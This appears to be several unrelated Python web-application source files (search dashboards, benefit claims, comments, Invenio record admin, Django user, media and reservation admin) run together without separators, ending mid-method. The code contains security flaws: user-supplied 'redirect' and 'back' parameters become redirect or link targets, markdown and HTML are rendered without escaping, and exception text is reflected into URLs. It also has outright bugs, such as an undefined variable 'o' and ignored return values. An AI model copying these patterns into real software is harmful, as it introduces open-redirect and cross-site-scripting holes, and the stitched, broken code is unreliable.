      query['qs'][0]['q'] = request.GET.get('q')                    
    if 'qd' in request.GET:
      query['qd'] = request.GET.get('qd')                    

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': json.dumps(query),
    'initial': json.dumps({
        'collections': [],
        'layout': DEFAULT_LAYOUT,
        'is_latest': LATEST.get(),
        'engines': get_engines(request.user)
    }),
    'is_owner': collection_doc.doc.get().can_write(request.user),                    
    'can_edit_index': can_edit_index(request.user),
    'is_embeddable': request.GET.get('is_embeddable', False),
    'mobile': is_mobile,
  })

def index_m(request):
  return index(request, True)

def new_search(request):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections:
    return no_collections(request)

  collection = Collection2(user=request.user, name=collections[0], engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  if request.GET.get('format', 'plain') == 'json':
    return JsonResponse({
      'collection': collection.get_props(request.user),
      'query': query,
      'initial': {
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }
     })
  else:
    return render('search.mako', request, {
      'collection': collection,
      'query': query,
      'initial': json.dumps({
          'collections': collections,
          'layout': DEFAULT_LAYOUT,
          'is_latest': LATEST.get(),
          'engines': get_engines(request.user)
       }),
      'is_owner': True,
      'is_embeddable': request.GET.get('is_embeddable', False),
      'can_edit_index': can_edit_index(request.user)
    })

def browse(request, name, is_mobile=False):
  engine = request.GET.get('engine', 'solr')
  collections = get_engine(request.user, engine).datasets()
  if not collections and engine == 'solr':
    return no_collections(request)

  collection = Collection2(user=request.user, name=name, engine=engine)
  query = {'qs': [{'q': ''}], 'fqs': [], 'start': 0}

  template = 'search.mako'
  if is_mobile:
    template = 'search_m.mako'

  return render(template, request, {
    'collection': collection,
    'query': query,
    'initial': json.dumps({
      'autoLoad': True,
      'collections': collections,
      'layout': [
          {"size":12,"rows":[{"widgets":[
              {"size":12,"name":"Grid Results","id":"52f07188-f30f-1296-2450-f77e02e1a5c0","widgetType":"resultset-widget",
               "properties":{},"offset":0,"isLoading":True,"klass":"card card-widget span12"}]}],
          "drops":["temp"],"klass":"card card-home card-column span10"}
      ],
      'is_latest': LATEST.get(),
      'engines': get_engines(request.user)
    }),
    'is_owner': True,
    'is_embeddable': request.GET.get('is_embeddable', False),
    'can_edit_index': can_edit_index(request.user),
    'mobile': is_mobile
  })


def browse_m(request, name):
  return browse(request, name, True)


@allow_owner_only
def save(request):
  response = {'status': -1}

  collection = json.loads(request.POST.get('collection', '{}'))
  layout = json.loads(request.POST.get('layout', '{}'))

  collection['template']['extracode'] = escape(collection['template']['extracode'])

  if collection:
    if collection['id']:
      dashboard_doc = Document2.objects.get(id=collection['id'])
    else:
      dashboard_doc = Document2.objects.create(name=collection['name'], uuid=collection['uuid'], type='search-dashboard', owner=request.user, description=collection['label'])
      Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard')

    dashboard_doc.update_data({
        'collection': collection,
        'layout': layout
    })
    dashboard_doc1 = dashboard_doc.doc.get()
    dashboard_doc.name = dashboard_doc1.name = collection['label']
    dashboard_doc.description = dashboard_doc1.description = collection['description']
    dashboard_doc.save()
    dashboard_doc1.save()

    response['status'] = 0
    response['id'] = dashboard_doc.id
    response['message'] = _('Page saved !')
  else:
    response['message'] = _('There is no collection to search.')

  return JsonResponse(response)


def no_collections(request):
  return render('no_collections.mako', request, {'is_embeddable': request.GET.get('is_embeddable', False)})


def admin_collections(request, is_redirect=False, is_mobile=False):
  existing_hue_collections = DashboardController(request.user).get_search_collections()

  if request.GET.get('format') == 'json':
    collections = []
    for collection in existing_hue_collections:
      massaged_collection = collection.to_dict()
      if request.GET.get('is_mobile'):
        massaged_collection['absoluteUrl'] = reverse('search:index_m') + '?collection=%s' % collection.id
      massaged_collection['isOwner'] = collection.doc.get().can_write(request.user)
      collections.append(massaged_collection)
    return JsonResponse(collections, safe=False)

  template = 'admin_collections.mako'
  if is_mobile:
    template = 'admin_collections_m.mako'

  return render(template, request, {
    'is_embeddable': request.GET.get('is_embeddable', False),
    'existing_hue_collections': existing_hue_collections,
    'is_redirect': is_redirect
  })


def admin_collection_delete(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.delete_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)


def admin_collection_copy(request):
  if request.method != 'POST':
    raise PopupException(_('POST request required.'))

  collections = json.loads(request.POST.get('collections'))
  searcher = DashboardController(request.user)
  response = {
    'result': searcher.copy_collections([collection['id'] for collection in collections])
  }

  return JsonResponse(response)

from django.views.generic import TemplateView, FormView, DetailView
from django.urls import reverse

from .entryform import EntryForm, entry_form_config, build_question_flag
from .models import LifeCondition, Benefit, BenefitRequirement


class BenefitOverview(TemplateView):
    template_name = 'core/benefit_overview.html'

    def get_context_data(self):
        data = super().get_context_data()
        data['life_conditions'] = LifeCondition.objects.with_benefits()
        return data


class BenefitClaimView(FormView):
    template_name = 'core/benefit_claim.html'
    form_class = EntryForm

    def get(self, request, *args, **kwargs):
        form = self.get_form()

        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.render_to_response(self.get_context_data())

    def get_form_kwargs(self, *args, **kwargs):
        kwargs = super().get_form_kwargs()
        kwargs['entry_form_config'] = entry_form_config

        question_ids = {str(q['id']) for q in entry_form_config}
        data = {
            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids
        }

        if data:
            kwargs['data'] = data

        return kwargs

    def form_valid(self, form):
        selected_flags = []

        # Assemble query
        for question in entry_form_config:
            flag = form.cleaned_data.get(str(question['id']), False)

            if flag:
                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))

        return self.render_to_response({
            'form': form,
            'submitted': True,
            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),
        })


class BenefitDetailView(DetailView):
    model = Benefit
    template_name = 'core/benefit_detail.html'

    def get_context_data(self, *args, **kwargs):
        data = super().get_context_data(*args, **kwargs)

        if self.request.GET.get('back', None) is not None:                    
            data['back_link'] = self.request.GET['back']                    

        return data


culture_events_shown_on_home_page = 10
auto_cross_reference = True                    

import asyncio

import mistune
from tortoise import fields
from tortoise.query_utils import Q
from arq import create_pool

from config import REDIS_URL
from .base import BaseModel
from .mc import cache, clear_mc
from .user import GithubUser
from .consts import K_COMMENT, ONE_HOUR
from .react import ReactMixin, ReactItem
from .signals import comment_reacted
from .utils import RedisSettings

markdown = mistune.Markdown()
MC_KEY_COMMENT_LIST = 'comment:%s:comment_list'
MC_KEY_N_COMMENTS = 'comment:%s:n_comments'
MC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'


class Comment(ReactMixin, BaseModel):
    github_id = fields.IntField()
    post_id = fields.IntField()
    ref_id = fields.IntField(default=0)
    kind = K_COMMENT

    class Meta:
        table = 'comments'

    async def set_content(self, content):
        return await self.set_props_by_key('content', content)

    async def save(self, *args, **kwargs):
        content = kwargs.pop('content', None)
        if content is not None:
            await self.set_content(content)
        return await super().save(*args, **kwargs)

    @property
    async def content(self):
        rv = await self.get_props_by_key('content')
        if rv:
            return rv.decode('utf-8')

    @property
    async def html_content(self):
        content = await self.content                    
        if not content:
            return ''
        return markdown(content)

    async def clear_mc(self):
        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):
            await clear_mc(key % self.post_id)

    @property
    async def user(self):
        return await GithubUser.get(gid=self.github_id)

    @property
    async def n_likes(self):
        return (await self.stats).love_count


class CommentMixin:
    async def add_comment(self, user_id, content, ref_id=0):
        obj = await Comment.create(github_id=user_id, post_id=self.id,
                                   ref_id=ref_id)
        redis = await create_pool(RedisSettings.from_url(REDIS_URL))
        await asyncio.gather(
            obj.set_content(content),
            redis.enqueue_job('mention_users', self.id, content, user_id),
            return_exceptions=True
        )
        return obj

    async def del_comment(self, user_id, comment_id):
        c = await Comment.get(id=comment_id)
        if c and c.github_id == user_id and c.post_id == self.id:
            await c.delete()
            return True
        return False

    @property
    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))
    async def comments(self):
        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])

    @property
    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))
    async def n_comments(self):
        return await Comment.filter(post_id=self.id).count()

    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
        '{user_id}', '{self.id}'), ONE_HOUR)
    async def comment_ids_liked_by(self, user_id):
        cids = [c.id for c in await self.comments]
        if not cids:
            return []
        queryset = await ReactItem.filter(
            Q(user_id=user_id), Q(target_id__in=cids),
            Q(target_kind=K_COMMENT))
        return [item.target_id for item in queryset]


@comment_reacted.connect
async def update_comment_list_cache(_, user_id, comment_id):
    comment = await Comment.cache(comment_id)
    if comment:
        asyncio.gather(
            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),
            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (
                user_id, comment.post_id)),
            return_exceptions=True
        )

# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

"""Admin model views for records."""

import json

from flask import flash
from flask_admin.contrib.sqla import ModelView
from flask_babelex import gettext as _
from invenio_admin.filters import FilterConverter
from invenio_db import db
from markupsafe import Markup
from sqlalchemy.exc import SQLAlchemyError

from .api import Record
from .models import RecordMetadata


class RecordMetadataModelView(ModelView):
    """Records admin model view."""

    filter_converter = FilterConverter()
    can_create = False
    can_edit = False
    can_delete = True
    can_view_details = True
    column_list = ('id', 'version_id', 'updated', 'created',)
    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')
    column_labels = dict(
        id=_('UUID'),
        version_id=_('Revision'),
        json=_('JSON'),
    )
    column_formatters = dict(
        version_id=lambda v, c, m, p: m.version_id-1,
        json=lambda v, c, m, p: Markup("<pre>{0}</pre>".format(                    
            json.dumps(m.json, indent=2, sort_keys=True)))                    
    )
    column_filters = ('created', 'updated', )
    column_default_sort = ('updated', True)
    page_size = 25

    def delete_model(self, model):
        """Delete a record."""
        try:
            if model.json is None:
                return True
            record = Record(model.json, model=model)
            record.delete()
            db.session.commit()
        except SQLAlchemyError as e:
            if not self.handle_view_exception(e):
                flash(_('Failed to delete record. %(error)s', error=str(e)),
                      category='error')
            db.session.rollback()
            return False
        return True

record_adminview = dict(
    modelview=RecordMetadataModelView,
    model=RecordMetadata,
    category=_('Records'))

# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2015-2018 CERN.
#
# Invenio is free software; you can redistribute it and/or modify it
# under the terms of the MIT License; see LICENSE file for more details.

"""Test admin interface."""

from __future__ import absolute_import, print_function

import uuid

from flask import url_for
from flask_admin import Admin, menu
from mock import patch
from sqlalchemy.exc import SQLAlchemyError

from invenio_records.admin import record_adminview
from invenio_records.api import Record


def test_admin(app, db):
    """Test flask-admin interace."""
    admin = Admin(app, name="Test")

    assert 'model' in record_adminview
    assert 'modelview' in record_adminview

    # Register both models in admin
    model = record_adminview.pop('model')
    view = record_adminview.pop('modelview')
    admin.add_view(view(model, db.session, **record_adminview))

    # Check if generated admin menu contains the correct items
    menu_items = {str(item.name): item for item in admin.menu()}
    assert 'Records' in menu_items
    assert menu_items['Records'].is_category()

    submenu_items = {
        str(item.name): item for item in menu_items['Records'].get_children()}
    assert 'Record Metadata' in submenu_items
    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)

    # Create a test record.
    rec_uuid = str(uuid.uuid4())
    Record.create({'title': 'test'}, id_=rec_uuid)                    
    db.session.commit()

    with app.test_request_context():
        index_view_url = url_for('recordmetadata.index_view')
        delete_view_url = url_for('recordmetadata.delete_view')
        detail_view_url = url_for(
            'recordmetadata.details_view', id=rec_uuid)

    with app.test_client() as client:
        # List index view and check record is there.
        res = client.get(index_view_url)
        assert res.status_code == 200

        # Fake a problem with SQLAlchemy.
        with patch('invenio_records.models.RecordMetadata') as db_mock:
            db_mock.side_effect = SQLAlchemyError()
            res = client.post(
                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
            assert res.status_code == 200

        # Delete it.
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200

        # View the delete record
        res = client.get(detail_view_url)
        assert res.status_code == 200
        assert '<pre>null</pre>' in res.get_data(as_text=True)

        # Delete it again
        res = client.post(
            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)
        assert res.status_code == 200

from django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest
from django.shortcuts import redirect
from django.contrib.auth.models import User
from . import page_skeleton, magic
from .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum
from ..models import Profile, Media
from ..uitools.dataforge import get_csrf_form_element
from .magic import get_current_user
import logging


def render_edit_page(http_request: HttpRequest, action_url: str):

    user_id = None
    profile: Profile = None
    if http_request.GET.get("user_id"):
        user_id = int(http_request.GET["user_id"])
    if user_id is not None:
        profile = Profile.objects.get(pk=user_id)
    f = Form()
    f.action_url = action_url
    if profile:
        f.add_content(PlainText('<h3>Edit user "' + profile.authuser.username + '"</h3>'))
        f.add_content(PlainText('<a href="/admin/media/select?action_url=/admin/actions/change-user-avatar'
                                '&payload=' + str(user_id) + '"><img class="button-img" alt="Change avatar" '
                                'src="/staticfiles/frontpage/change-avatar.png"/></a><br />'))
    else:
        f.add_content(PlainText('<h3>Add new user</h3>'))
    if not profile:
        f.add_content(PlainText("username (can't be edited later on): "))
        f.add_content(TextField(name='username'))
    if http_request.GET.get('fault') and profile:
        f.add_content(PlainText("Unable to edit user due to: " + str(http_request.GET['fault'])))
    elif http_request.GET.get('fault'):
        f.add_content(PlainText("Unable to add user due to: " + str(http_request.GET['fault'])))
    current_user: Profile = get_current_user(http_request)
    if current_user.rights > 3:
        if not profile:
            f.add_content(CheckBox(name="active", text="User Active", checked=CheckEnum.CHECKED))
        else:
            m: CheckEnum = CheckEnum.CHECKED
            if not profile.active:
                m = CheckEnum.NOT_CHECKED
            f.add_content(CheckBox(name="active", text="User Active", checked=m))
    if profile:
        f.add_content(PlainText("Email address: "))
        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))
        f.add_content(PlainText("Display name: "))
        f.add_content(TextField(name='display_name', button_text=profile.displayName))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))
        f.add_content(PlainText("Rights: "))
        f.add_content(NumberField(name="rights", button_text=str(profile.rights), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', text=str(profile.notes)))
    else:
        f.add_content(PlainText("Email address: "))
        f.add_content(TextField(name='email'))
        f.add_content(PlainText("Display name: "))
        f.add_content(TextField(name='display_name'))
        f.add_content(PlainText('DECT: '))
        f.add_content(NumberField(name='dect', minimum=0))
        f.add_content(PlainText('Number of allowed reservations: '))
        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))
        f.add_content(PlainText("Rights: "))
        f.add_content(NumberField(name="rights", button_text=str(0), minimum=0, maximum=4))
        f.add_content(PlainText('Notes:<br/>'))
        f.add_content(TextArea(name='notes', placeholder="Hier könnte ihre Werbung stehen"))
    if profile:
        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))
    else:
        f.add_content(PlainText('<br />Choose a password: '))
    f.add_content(PasswordField(name='password', required=False))
    f.add_content(PlainText('Confirm your password: '))
    f.add_content(PasswordField(name='confirm_password', required=False))
    f.add_content(PlainText(get_csrf_form_element(http_request)))
    f.add_content(SubmitButton())
    # a = page_skeleton.render_headbar(http_request, "Edit User")
    a = '<div class="w3-row w3-padding-64 w3-twothird w3-container admin-popup">'
    a += f.render_html(http_request)
    # a += page_skeleton.render_footer(http_request)
    a += "</div>"
    return a


def check_password_conformity(pw1: str, pw2: str):
    if not (pw1 == pw2):
        return False
    if len(pw1) < 6:
        return False
    if pw1.isupper():
        return False
    if pw1.islower():
        return False
    return True


def recreate_form(reason: str):
    return redirect('/admin/users/edit?fault=' + str(reason))


def action_save_user(request: HttpRequest, default_forward_url: str = "/admin/users"):
    """
    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse
    :param request: the HttpRequest
    :param default_forward_url: The URL to forward to if nothing was specified
    :return: The crafted HttpResponse
    """
    forward_url = default_forward_url
    if request.GET.get("redirect"):
        forward_url = request.GET["redirect"]
    if not request.user.is_authenticated:
        return HttpResponseForbidden()
    profile = Profile.objects.get(authuser=request.user)
    if profile.rights < 2:
        return HttpResponseForbidden()
    try:
        if request.GET.get("user_id"):
            pid = int(request.GET["user_id"])
            displayname = str(request.POST["display_name"])
            dect = int(request.POST["dect"])
            notes = str(request.POST["notes"])
            pw1 = str(request.POST["password"])
            pw2 = str(request.POST["confirm_password"])
            mail = str(request.POST["email"])
            rights = int(request.POST["rights"])
            user: Profile = Profile.objects.get(pk=pid)
            user.displayName = displayname                    
            user.dect = dect
            user.notes = notes                    
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST["allowed_reservations"])
            if request.POST.get("active"):
                user.active = magic.parse_bool(request.POST["active"])
            au: User = user.authuser
            if check_password_conformity(pw1, pw2):
                logging.log(logging.INFO, "Set password for user: " + user.displayName)
                au.set_password(pw1)
            else:
                logging.log(logging.INFO, "Failed to set password for: " + user.displayName)
            au.email = mail                    
            au.save()
            user.save()
        else:
            # assume new user
            username = str(request.POST["username"])
            displayname = str(request.POST["display_name"])
            dect = int(request.POST["dect"])
            notes = str(request.POST["notes"])
            pw1 = str(request.POST["password"])
            pw2 = str(request.POST["confirm_password"])
            mail = str(request.POST["email"])
            rights = int(request.POST["rights"])
            if not check_password_conformity(pw1, pw2):
                recreate_form('password mismatch')
            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)                    
            auth_user.save()
            user: Profile = Profile()
            user.rights = rights
            user.number_of_allowed_reservations = int(request.POST["allowed_reservations"])
            user.displayName = displayname                    
            user.authuser = auth_user
            user.dect = dect
            user.notes = notes                    
            user.active = True
            user.save()
            pass
        pass
    except Exception as e:
        return HttpResponseBadRequest(str(e))
    return redirect(forward_url)

from datetime import date, time
from django.shortcuts import redirect
from django.http import HttpRequest, HttpResponseBadRequest
from frontpage.models import Profile, Media, MediaUpload
from frontpage.management.magic import compile_markdown, get_current_user

import logging
import ntpath
import os
import math
import PIL
from PIL import Image


PATH_TO_UPLOAD_FOLDER_ON_DISK: str = "/usr/local/www/focweb/"
IMAGE_SCALE = 64


def action_change_user_avatar(request: HttpRequest):
    try:
        user_id = int(request.GET["payload"])
        media_id = int(request.GET["media_id"])
        user: Profile = Profile.objects.get(pk=int(user_id))
        u: Profile = get_current_user(request)
        if not (u == user) and u.rights < 4:
            return redirect("/admin?error='You're not allowed to edit other users.'")
        medium = Media.objects.get(pk=int(media_id))
        user.avatarMedia = medium
        user.save()
    except Exception as e:
        return redirect("/admin?error=" + str(e))
    return redirect("/admin/users")


def handle_file(u: Profile, headline: str, category: str, text: str, file):
    m: Media = Media()
    upload_base_path: str = 'uploads/' + str(date.today().year)
    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace(" ", "_"))
    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace(" ", "_"))
    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):
        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)
    with open(high_res_file_name, 'wb+') as destination:
        for chunk in file.chunks():
            destination.write(chunk)
    # TODO crop image
    original = Image.open(high_res_file_name)
    width, height = original.size
    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))
    width /= diameter
    height /= diameter
    width *= IMAGE_SCALE
    height *= IMAGE_SCALE
    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)
    cropped.save(low_res_file_name)
    m.text = text                    
    m.cachedText = compile_markdown(text)                    
    m.category = category                    
    m.highResFile = "/" + high_res_file_name
    m.lowResFile = "/" + low_res_file_name
    m.headline = headline                    
    m.save()
    mu: MediaUpload = MediaUpload()
    mu.UID = u
    mu.MID = m
    mu.save()
    logging.info("Uploaded file '" + str(file.name) + "' and cropped it. The resulting PK is " + str(m.pk))


def action_add_single_media(request: HttpRequest):
    try:
        headline = request.POST["headline"]
        category = request.POST["category"]
        text = request.POST["text"]
        file = request.FILES['file']
        user: Profile = get_current_user(request)
        handle_file(user, headline, category, text, file)
    except Exception as e:
        return redirect("/admin/media/add?hint=" + str(e))
    return redirect("/admin/media/add")


def action_add_multiple_media(request: HttpRequest):
    try:
        category: str = request.POST["category"]
        files = request.FILES.getlist('files')
        user: Profile = get_current_user(request)
        for f in files:
            handle_file(user, str(f.name), category, "### There is no media description", f)
    except Exception as e:
        return redirect("/admin/media/add?hint=" + str(e))
    return redirect("/admin/media/add")

from django.http import HttpRequest, HttpResponseRedirect
# from django.shortcuts import redirect
from ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation
from .magic import get_current_user
import json
import datetime

RESERVATION_CONSTRUCTION_COOKIE_KEY: str = "org.technikradio.c3shop.frontpage" + \
        ".reservation.cookiekey"
EMPTY_COOKY_VALUE: str = '''
{
"notes": "",
"articles": [],
"pickup_date": ""
}
'''


def update_reservation_articles(postdict, rid):
    res: GroupReservation = GroupReservation.objects.get(id=rid)



def add_article_action(request: HttpRequest, default_foreward_url: str):
    forward_url: str = default_foreward_url
    if request.GET.get("redirect"):
        forward_url = request.GET["redirect"]
    else:
        forward_url = "/admin"
    if "rid" not in request.GET:
        return HttpResponseRedirect("/admin?error=Missing%20reservation%20id%20in%20request")
    u: Profile = get_current_user(request)
    current_reservation = GroupReservation.objects.get(id=str(request.GET["rid"]))
    if current_reservation.createdByUser != u and u.rights < 2:
        return HttpResponseRedirect("/admin?error=noyb")
    if current_reservation.submitted == True:
        return HttpResponseRedirect("/admin?error=Already%20submitted")
    # Test for multiple or single article
    if "article_id" in request.POST:
        # Actual adding of article
        aid: int = int(request.GET.get("article_id"))
        quantity: int = int(request.POST["quantity"])
        notes: str = request.POST["notes"]                    
        ar = ArticleRequested()
        ar.AID = Article.objects.get(id=aid)
        ar.RID = current_reservation
        if "srid" in request.GET:
            ar.SRID = SubReservation.objects.get(id=int(request.GET["srid"]))
        ar.amount = quantity
        ar.notes = notes
        ar.save()
    # Actual adding of multiple articles
    else:
        if "group_id" not in request.GET:
            return HttpResponseRedirect("/admin?error=missing%20group%20id")
        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET["group_id"]))
        for art in Article.objects.all().filter(group=g):
            if str("quantity_" + str(art.id)) not in request.POST or str("notes_" + str(art.id)) not in request.POST:
                return HttpResponseRedirect("/admin?error=Missing%20article%20data%20in%20request")
            amount = int(request.POST["quantity_" + str(art.id)])
            if amount > 0:
                ar = ArticleRequested()
                ar.AID = art
                ar.RID = current_reservation
                ar.amount = amount
                if "srid" in request.GET:
                    ar.SRID = SubReservation.objects.get(id=int(request.GET["srid"]))
                ar.notes = str(request.POST[str("notes_" + str(art.id))])                    
                ar.save()
    if "srid" in request.GET:
        response = HttpResponseRedirect(forward_url + "?rid=" + str(current_reservation.id) + "&srid=" + request.GET["srid"])
    else:
        response = HttpResponseRedirect(forward_url + "?rid=" + str(current_reservation.id))
    return response


def write_db_reservation_action(request: HttpRequest):
    """
    This function is used to submit the reservation
    """
    u: Profile = get_current_user(request)
    forward_url = "/admin?success"
    if u.rights > 0:
        forward_url = "/admin/reservations"
    if request.GET.get("redirect"):
        forward_url = request.GET["redirect"]
    if "payload" not in request.GET:
        return HttpResponseRedirect("/admin?error=No%20id%20provided")
    current_reservation = GroupReservation.objects.get(id=int(request.GET["payload"]))
    if current_reservation.createdByUser != u and u. rights < 2:
        return HttpResponseRedirect("/admin?error=noyb")
    current_reservation.submitted = True
    current_reservation.save()
    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)
    return res


def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):
    """
    This function is used to alter the reservation beeing build inside
    a cookie. This function automatically crafts the required response.
    """
    js_string: str = ""
    r: GroupReservation = None
    u: Profile = get_current_user(request)
    forward_url: str = default_foreward_url
    if request.GET.get("redirect"):
        forward_url = request.GET["redirect"]
    if "srid" in request.GET:
        if not request.GET.get("rid"):
            return HttpResponseRedirect("/admin?error=missing%20primary%20reservation%20id")
        srid: int = int(request.GET["srid"])
        sr: SubReservation = None
        if srid == 0:
            sr = SubReservation()
        else:
            sr = SubReservation.objects.get(id=srid)
        if request.POST.get("notes"):
            sr.notes = request.POST["notes"]                    
        else:
            sr.notes = " "
        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET["rid"]))
        sr.save()
        print(request.POST)
        print(sr.notes)
        return HttpResponseRedirect("/admin/reservations/edit?rid=" + str(int(request.GET["rid"])) + "&srid=" + str(sr.id))
    if "rid" in request.GET:
        # update reservation
        r = GroupReservation.objects.get(id=int(request.GET["rid"]))
    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():
        r = GroupReservation()
        r.createdByUser = u
        r.ready = False
        r.open = True
        r.pickupDate = datetime.datetime.now()
    else:
        return HttpResponseRedirect("/admin?error=Too%20Many%20reservations")
    if request.POST.get("notes"):
        r.notes = request.POST["notes"]
    if request.POST.get("contact"):
        r.responsiblePerson = str(request.POST["contact"])                    
    if (r.createdByUser == u or o.rights > 1) and not r.submitted:
        r.save()
    else:
        return HttpResponseRedirect("/admin?error=noyb")
    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + "?rid=" + str(r.id))
    return response


def action_delete_article(request: HttpRequest):
    """
    This function removes an article from the reservation and returnes
    the required resonse.
    """
    u: Profile = get_current_user(request)
    if "rid" in request.GET:
        if "srid" in request.GET:
            response = HttpResponseRedirect("/admin/reservations/edit?rid=" + str(int(request.GET["rid"])) + \
                    '&srid=' + str(int(request.GET['srid'])))
        else:
            response = HttpResponseRedirect("/admin/reservations/edit?rid=" + str(int(request.GET["rid"])))
    else:
        return HttpResponseRedirect("/admin?error=Missing%20reservation%20id%20in%20request")
    if request.GET.get("id"):
        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET["id"]))
        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET["rid"]))
        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:
            aid.delete()
        else:
            return HttpResponseRedirect("/admin?error=You're%20not%20allowed%20to%20do%20this")
    return response

import datetime

from django.core.exceptions import FieldDoesNotExist
from django.db.models import BooleanField, ForeignKey
from django.utils.formats import localize
from django.utils.html import format_html, escape
from django.utils.http import urlencode
from django.utils.translation import gettext_lazy as _
from typing import List

from smart_lists.exceptions import SmartListException
from smart_lists.filters import SmartListFilter


class TitleFromModelFieldMixin(object):
    def get_title(self):
        if self.label:
            return self.label
        elif self.model_field:
            return self.model_field.verbose_name.title()
        elif self.field_name == '__str__':
            return self.model._meta.verbose_name.title()
        try:
            field = getattr(self.model, self.field_name)
        except AttributeError as e:
            return self.field_name.title()
        if callable(field) and getattr(field, 'short_description', False):
            return field.short_description
        return self.field_name.replace("_", " ").title()


class QueryParamsMixin(object):
    def get_url_with_query_params(self, new_query_dict):
        query = dict(self.query_params).copy()
        for key, value in query.items():
            if type(value) == list:
                query[key] = value[0]
        query.update(new_query_dict)
        for key, value in query.copy().items():
            if value is None:
                del query[key]
        return '?{}'.format(urlencode(query))


class SmartListField(object):
    def __init__(self, smart_list_item, column, object):
        self.smart_list_item = smart_list_item
        self.column = column
        self.object = object

    def get_value(self):
        if self.column.render_function:                    
            # We don't want to escape our html
            return self.column.render_function(self.object)                    

        field = getattr(self.object, self.column.field_name) if self.column.field_name else None
        if type(self.object) == dict:                    
            value = self.object.get(self.column.field_name)
        elif callable(field):
            value = field() if getattr(field, 'do_not_call_in_templates', False) else field
        else:
            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)
            value = display_function() if display_function else field

        return escape(value)                    

    def format(self, value):
        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):
            return localize(value)
        return value

    def render(self):
        return format_html(
            '<td>{}</td>', self.format(self.get_value())
        )

    def render_link(self):
        if not hasattr(self.object, 'get_absolute_url'):
            raise SmartListException("Please make sure your model {} implements get_absolute_url()".format(type(self.object)))
        return format_html(
            '<td><a href="{}">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())
        )


class SmartListItem(object):
    def __init__(self, smart_list, object):
        self.smart_list = smart_list
        self.object = object

    def fields(self):
        return [
            SmartListField(self, column, self.object) for column in self.smart_list.columns
        ]


class SmartOrder(QueryParamsMixin, object):
    def __init__(self, query_params, column_id, ordering_query_param):
        self.query_params = query_params
        self.column_id = column_id
        self.ordering_query_param = ordering_query_param
        self.query_order = query_params.get(ordering_query_param)
        self.current_columns = [int(col) for col in self.query_order.replace("-", "").split(".")] if self.query_order else []
        self.current_columns_length = len(self.current_columns)

    @property
    def priority(self):
        if self.is_ordered():
            return self.current_columns.index(self.column_id) + 1

    def is_ordered(self):
        return self.column_id in self.current_columns

    def is_reverse(self):
        for column in self.query_order.split('.'):
            c = column.replace("-", "")
            if int(c) == self.column_id:
                if column.startswith("-"):
                    return True
        return False

    def get_add_sort_by(self):
        if not self.is_ordered():
            if self.query_order:
                return self.get_url_with_query_params({
                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)
                })
